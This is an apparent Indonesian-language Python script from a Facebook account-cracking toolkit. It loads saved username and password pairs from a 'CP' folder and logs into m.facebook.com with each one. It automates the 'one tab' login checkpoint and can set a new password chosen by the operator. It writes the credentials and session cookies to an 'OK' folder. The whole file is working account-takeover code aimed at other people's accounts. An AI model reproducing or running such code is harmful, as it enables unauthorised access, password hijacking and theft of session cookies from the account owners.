#--- MODULE 
from xyz import *

#--- TANGGAL BULAN 
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month 

waktu = ("{}-{}-{}").format(hari,bulan,tahun)
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#--- JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)

#--- APPEND
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

"""

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 CODING BY GUWEH ROMI AFRIZAL :v

"""
cepe = []
#--- CEKPOINT DETEKTOR
def file_cp():
	try:
		dirs = os.listdir('CP')
		for file in dirs:
			cepe.append(file)
	except:pass 
	if len(cepe)==0:
		exit("%s╰─ %sfile tidak tersedia "%(p,m))
	else:
		tulis(Panel(f"{Te}{U} •{O} Hasil akun{K} CP{O} yang tersimpan di folder anda ",style='#FF0022'))
		nomor = 0
		for i in cepe:
			fil = open(f"CP/{i}").read().splitlines() 
			nomor+=1
			print(f"{p} {str(nomor)}.{k} {i} {o}-{k} {str(len(fil))} ")
		tulis(Panel(f"{Te}{U} •{O} Silahkan pilih nomor yang ingin di cek ",style='#FF0022'))
		file = input(f"{p}╰─{o} nomor {m}>{k} ")
		try:
			hasil = cepe[int(file)-1]
		except (KeyError,IndexError,ValueError):
			exit ('%s╰─%s isi yang benar kentod'%(p,m));jeda(2)
		opsi(hasil)

def opsi(hasil):
	try:
		file_cp = open(f"CP/{hasil}", "r").readlines()
	except IOError:
		exit("%s╰─%s nama file %s tidak tersedia"%(p,m,romi))
	tulis(Panel(f"{Te} {U}•{O} Mode pesawatkan terlebih dahulu 5 detik ",style='#FF0022'))
	pw=input("%s╰─%s ubah sandi pada akun one tab? y/t %s> %s"%(p,o,m,k))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s╰─%s masukan sandi %s> %s"%(p,o,m,k))
		if len(pw2) <= 5:
			print("%s╰─ %ssandi minimal 6 karakter "%(p,m))
		else:
			pwbaru.append(pw2)
	tulis(Panel(f"{Te}{U} •{O} total akun {M}: {K}{str(len(file_cp))}",style='#FF0022'))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" ◊ ")
		nomor+=1
		tulis(Panel(f"{Te}{H} {str(nomor)}.{O} login akun {M}> {K}{akun.replace(' *--> ','')}",style='#FF0022'))
		try:
			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1], ENG)
		except requests.exceptions.ConnectionError:
			continue 
	tulis(Panel(f"{Te}{U} •{O} Selesai mengecek akun",style='#FF0022'))
	exit()
	
data = {}
data2 = {}

def mengecek(user,pw,ENG):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://m.facebook.com"
	session.headers.update({
		"Host": "mbasic.facebook.com",
		"cache-control": "max-age=0",
		"upgrade-insecure-requests": "1",
		"origin": "https://m.facebook.com",
		"content-type": "application/x-www-form-urlencoded",
		"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]",
		"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"x-requested-with": "mark.via.gp",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "navigate",
		"sec-fetch-user": "?1",
		"sec-fetch-dest": "document",
		"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
		"accept-encoding": "gzip, deflate",
		"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s╰─%s akun terkunci sesi new"%(p,m))
		else:
			print("\r%s╰─%s akun tidak checkpoint, silahkan anda login "%(p,h))
			open('OK/%s.txt'%(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s╰──%s terdapat %s%s%s opsi %s:"%(p,o,p,str(len(cek)),o,m));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s ╰─ %sakun one tab, sandi berhasil di ubah \n%s ╰─ %s%s ◊ %s \n%s ╰─%s %s			"%(p,h,p,h,user,pwbaru[0],p,h,coki))
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pwbaru[0],coki))
				else:
					print("\r%s ╰─%s akun one tab, silahkan anda login		"%(p,h))
					open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pw,coki))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s ╰─ %sakun terpasang autentikasi dua faktor			"%(p,m))
			else:
				print("%s ╰─%s terjadi kesalahan"%(p,m))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s╰─%s akun tidak checkpoint, silahkan anda login "%(p,h))
				open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("%s ╰─ %s. %s%s"%(p,str(number),k,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s%s"%(p,m,oh))
	else:
		print("%s╰─%s login gagal, silahkan cek kembali id dan password"%(p,m))
	
"""

    Biar apa sih di decompile anyink
    Taekkk !

"""
